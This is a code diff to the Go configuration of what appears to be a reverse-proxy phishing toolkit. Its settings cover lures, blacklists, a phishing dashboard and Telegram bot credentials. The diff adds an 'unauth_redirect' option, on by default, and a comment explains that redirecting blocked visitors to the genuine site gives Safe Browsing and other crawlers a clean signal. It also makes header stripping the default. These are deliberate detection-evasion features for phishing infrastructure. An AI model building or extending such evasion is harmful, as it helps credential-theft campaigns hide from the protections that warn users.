@@ -93,19 +93,20 @@ type GoPhishConfig struct {
 }
 
 type GeneralConfig struct {
-	Domain       string `mapstructure:"domain" json:"domain" yaml:"domain"`
-	OldIpv4      string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
-	ExternalIpv4 string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
-	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
-	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
-	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
-	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
-	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
-	TelegramEnabled bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
-	HttpPort         int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
-	Chatid    string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
-	Teletoken string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
+	Domain             string `mapstructure:"domain" json:"domain" yaml:"domain"`
+	OldIpv4            string `mapstructure:"ipv4" json:"ipv4" yaml:"ipv4"`
+	ExternalIpv4       string `mapstructure:"external_ipv4" json:"external_ipv4" yaml:"external_ipv4"`
+	BindIpv4           string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
+	UnauthUrl          string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
+	HttpsPort          int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	DnsPort            int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
+	Autocert           bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
+	TelegramEnabled    bool   `mapstructure:"telegram_enabled" json:"telegram_enabled" yaml:"telegram_enabled"`
+	HttpPort           int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"`
+	Chatid             string `mapstructure:"chatid" json:"chatid" yaml:"chatid"`
+	Teletoken          string `mapstructure:"teletoken" json:"teletoken" yaml:"teletoken"`
 	StripHeaders       bool   `mapstructure:"strip_headers" json:"strip_headers" yaml:"strip_headers"`
+	UnauthRedirect     bool   `mapstructure:"unauth_redirect" json:"unauth_redirect" yaml:"unauth_redirect"`
 	DashboardSubdomain string `mapstructure:"dashboard_sub" json:"dashboard_sub" yaml:"dashboard_sub"`
 	DashboardUser      string `mapstructure:"dashboard_user" json:"dashboard_user" yaml:"dashboard_user"`
 	DashboardPass      string `mapstructure:"dashboard_pass" json:"dashboard_pass" yaml:"dashboard_pass"`
@@ -189,6 +190,10 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		c.cfg.Set("general.autocert", true)
 		c.general.Autocert = true
 	}
+	if c.cfg.Get("general.strip_headers") == nil {
+		c.cfg.Set("general.strip_headers", true)
+		c.general.StripHeaders = true
+	}
 
 	c.cfg.UnmarshalKey(CFG_BLACKLIST, &c.blacklistConfig)
 
@@ -207,6 +212,13 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 
 	if c.general.UnauthUrl == "" && created_cfg {
 		c.SetUnauthUrl(DEFAULT_UNAUTH_URL)
+	}
+	// unauthorized/blocked traffic is turned away with an HTTP 302 to unauth_url by
+	// default (instead of rendering a fetched copy). A redirect makes Safe Browsing
+	// and other crawlers land on the genuine site, which is the cleanest signal.
+	if !c.cfg.IsSet("general.unauth_redirect") {
+		c.general.UnauthRedirect = true
+		c.cfg.Set("general.unauth_redirect", true)
 	}
 	if c.general.HttpsPort == 0 {
 		c.SetHttpsPort(443)
@@ -1054,6 +1066,23 @@ func (c *Config) GetHttpPort() int {
 
 func (c *Config) GetUnauthUrl() string {
 	return c.general.UnauthUrl
+}
+
+// IsUnauthRedirectEnabled returns true when unauthorized/blocked requests should be
+// answered with a 302 redirect to unauth_url rather than a rendered fake page.
+func (c *Config) IsUnauthRedirectEnabled() bool {
+	return c.general.UnauthRedirect
+}
+
+func (c *Config) SetUnauthRedirect(enabled bool) {
+	c.general.UnauthRedirect = enabled
+	c.cfg.Set(CFG_GENERAL, c.general)
+	if enabled {
+		log.Info("unauthorized requests will be redirected (302) to unauth_url")
+	} else {
+		log.Info("unauthorized requests will be served a rendered copy of unauth_url")
+	}
+	c.cfg.WriteConfig()
 }
 
 func (c *Config) GetLureGenerationStrategy() string {
